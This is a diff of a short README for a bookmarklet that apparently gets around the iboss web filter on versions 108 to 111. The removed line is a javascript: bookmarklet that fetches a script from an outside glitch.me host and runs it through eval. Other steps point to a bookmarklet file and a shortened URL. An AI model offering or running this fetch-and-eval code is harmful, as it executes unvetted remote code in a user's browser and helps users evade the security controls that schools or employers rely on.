@@ -1,7 +1,6 @@
 ## Disclaimer: this only works for iboss, if you want one for securely dm me. Also you need bookmarks enabled. Works on v108 to v111 (tested). ##
 
-Step 1. Bookmark this code: 
-javascript:opener.fetch("https://uboss.glitch.me/cod.js").then(data=>{data.text().then(e=>{eval(e)})})
+Step 1. Bookmark the code in min.bookmarklet.js
 
 
 Step 2. Go to  https://tinyurl.com/byeswamp.
